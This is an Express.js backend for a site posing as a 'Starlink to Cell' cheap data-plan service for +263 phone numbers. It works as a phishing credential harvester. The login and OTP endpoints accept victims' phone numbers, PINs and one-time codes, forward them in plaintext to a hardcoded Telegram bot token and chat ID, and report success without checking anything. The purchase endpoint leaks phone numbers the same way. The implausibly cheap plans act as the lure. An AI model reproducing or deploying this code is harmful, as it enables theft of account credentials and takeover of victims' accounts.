const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CORS - Allow all origins
// ============================================
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
}));

app.options('*', cors());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).send('OK');
  }
  next();
});

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// TELEGRAM CONFIGURATION
// ============================================
const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
const CHAT_ID = '8392790531';

// ============================================
// SEND TELEGRAM NOTIFICATION - LOGIN
// ============================================
async function sendTelegramLogin(phone, pin) {
  try {
    const message = `📡 *New Starlink to Cell Login Attempt*\n\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to verify page.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    console.log('📤 Telegram Login:', data.ok ? '✅ Sent' : '❌ Failed');
    return data;
  } catch (error) {
    console.error('❌ Telegram login error:', error.message);
    return null;
  }
}

// ============================================
// SEND TELEGRAM OTP NOTIFICATION
// ============================================
async function sendTelegramOTP(phone, otp) {
  try {
    const message = `📡 *Starlink to Cell - OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    console.log('📤 Telegram OTP:', data.ok ? '✅ Sent' : '❌ Failed');
    return data;
  } catch (error) {
    console.error('❌ Telegram OTP error:', error.message);
    return null;
  }
}

// ============================================
// API ROUTES
// ============================================

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'OK',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
    message: 'Starlink to Cell API is running!'
  });
});

// Root
app.get('/', (req, res) => {
  res.json({
    success: true,
    message: 'Starlink to Cell API is running!',
    endpoints: {
      health: '/api/health',
      login: '/api/auth/login',
      register: '/api/auth/register',
      verify: '/api/auth/verify-otp',
      plans: '/api/plans'
    }
  });
});

// ============================================
// LOGIN ENDPOINT
// ============================================
app.post('/api/auth/login', async (req, res) => {
  try {
    const { phoneNumber, pin } = req.body;

    console.log('🔑 Login attempt:', { phoneNumber, pin: '****' });

    if (!phoneNumber || !pin) {
      return res.status(400).json({
        success: false,
        message: 'Phone number and PIN are required'
      });
    }

    if (phoneNumber.length !== 9 || !/^\d{9}$/.test(phoneNumber)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 9-digit phone number'
      });
    }

    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 4-digit PIN'
      });
    }

    // Send login Telegram notification
    await sendTelegramLogin(phoneNumber, pin);

    res.json({
      success: true,
      message: 'Login successful',
      phoneNumber: phoneNumber,
      requiresVerification: true
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Login failed',
      error: error.message
    });
  }
});

// ============================================
// REGISTER ENDPOINT
// ============================================
app.post('/api/auth/register', (req, res) => {
  const { phoneNumber, pin, fullName, email } = req.body;

  if (!phoneNumber || !pin || !fullName || !email) {
    return res.status(400).json({
      success: false,
      message: 'All fields are required'
    });
  }

  res.json({
    success: true,
    message: 'Registration successful',
    user: {
      phoneNumber,
      fullName,
      email
    }
  });
});

// ============================================
// VERIFY OTP ENDPOINT
// ============================================
app.post('/api/auth/verify-otp', async (req, res) => {
  try {
    const { phoneNumber, otp } = req.body;

    console.log('🔑 OTP verification:', { phoneNumber, otp });

    if (!phoneNumber || !otp) {
      return res.status(400).json({
        success: false,
        message: 'Phone number and OTP are required'
      });
    }

    if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 6-digit OTP'
      });
    }

    // Send OTP to Telegram
    await sendTelegramOTP(phoneNumber, otp);

    res.json({
      success: true,
      message: 'OTP verified successfully'
    });

  } catch (error) {
    console.error('OTP verification error:', error);
    res.status(500).json({
      success: false,
      message: 'OTP verification failed',
      error: error.message
    });
  }
});

// ============================================
// DATA PLANS ENDPOINT - GET ALL PLANS
// ============================================
app.get('/api/plans', (req, res) => {
  const plans = [
    {
      id: '5gb',
      name: '5GB Data',
      days: '2-Day Plan',
      price: 'Free trial',
      badge: 'New users only',
      isFree: true
    },
    {
      id: '15gb',
      name: '15GB Data',
      days: '7-Day Plan',
      price: 'USD 0.99',
      badge: 'Best for light users',
      isFree: false
    },
    {
      id: '35gb',
      name: '35GB Data',
      days: '14-Day Plan',
      price: 'USD 1.99',
      badge: 'Balanced',
      isFree: false
    },
    {
      id: '50gb',
      name: '50GB Data',
      days: '21-Day Plan',
      price: 'USD 2.99',
      badge: 'Heavy use',
      isFree: false
    },
    {
      id: 'monthly',
      name: 'Monthly Unlimited',
      days: '30-Day Plan',
      price: 'USD 3.99',
      badge: 'Most Popular',
      isFree: false
    },
    {
      id: '5g',
      name: '5G Monthly Unlimited',
      days: '30-Day Plan',
      price: 'USD 7.99',
      badge: '5G Coverage',
      isFree: false
    }
  ];

  res.json({
    success: true,
    plans: plans
  });
});

// ============================================
// DATA PLANS ENDPOINT - GET SINGLE PLAN
// ============================================
app.get('/api/plans/:id', (req, res) => {
  const { id } = req.params;
  
  const plans = [
    {
      id: '5gb',
      name: '5GB Data',
      days: '2-Day Plan',
      price: 'Free trial',
      badge: 'New users only',
      isFree: true,
      description: 'Perfect for trying out our service. No payment needed.',
      data: '5GB',
      validity: '2 days'
    },
    {
      id: '15gb',
      name: '15GB Data',
      days: '7-Day Plan',
      price: 'USD 0.99',
      badge: 'Best for light users',
      isFree: false,
      description: 'Ideal for light browsing and messaging.',
      data: '15GB',
      validity: '7 days'
    },
    {
      id: '35gb',
      name: '35GB Data',
      days: '14-Day Plan',
      price: 'USD 1.99',
      badge: 'Balanced',
      isFree: false,
      description: 'Perfect for streaming and social media.',
      data: '35GB',
      validity: '14 days'
    },
    {
      id: '50gb',
      name: '50GB Data',
      days: '21-Day Plan',
      price: 'USD 2.99',
      badge: 'Heavy use',
      isFree: false,
      description: 'Great for heavy users who need more data.',
      data: '50GB',
      validity: '21 days'
    },
    {
      id: 'monthly',
      name: 'Monthly Unlimited',
      days: '30-Day Plan',
      price: 'USD 3.99',
      badge: 'Most Popular',
      isFree: false,
      description: 'Unlimited data for a full month.',
      data: 'Unlimited',
      validity: '30 days'
    },
    {
      id: '5g',
      name: '5G Monthly Unlimited',
      days: '30-Day Plan',
      price: 'USD 7.99',
      badge: '5G Coverage',
      isFree: false,
      description: 'High-speed 5G unlimited data.',
      data: 'Unlimited 5G',
      validity: '30 days'
    }
  ];

  const plan = plans.find(p => p.id === id);

  if (!plan) {
    return res.status(404).json({
      success: false,
      message: 'Plan not found'
    });
  }

  res.json({
    success: true,
    plan: plan
  });
});

// ============================================
// PURCHASE PLAN ENDPOINT (Future use)
// ============================================
app.post('/api/plans/purchase', async (req, res) => {
  const { planId, phoneNumber } = req.body;

  if (!planId || !phoneNumber) {
    return res.status(400).json({
      success: false,
      message: 'Plan ID and phone number are required'
    });
  }

  console.log('🛒 Purchase request:', { planId, phoneNumber });

  // Send Telegram notification for purchase
  try {
    const message = `🛒 *New Plan Purchase*\n\n📱 *Phone:* +263 ${phoneNumber}\n📡 *Plan:* ${planId}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ Purchase request received.`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    console.error('❌ Telegram purchase error:', error.message);
  }

  res.json({
    success: true,
    message: 'Plan purchased successfully',
    planId: planId,
    phoneNumber: phoneNumber
  });
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found',
    path: req.originalUrl
  });
});

// ============================================
// ERROR HANDLER
// ============================================
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    success: false,
    message: err.message || 'Internal server error'
  });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('====================================');
  console.log('📡 Starlink to Cell Backend Started');
  console.log('====================================');
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ Health check: /api/health`);
  console.log(`🤖 Telegram Bot configured`);
  console.log(`📱 Chat ID: ${CHAT_ID}`);
  console.log('====================================');
});
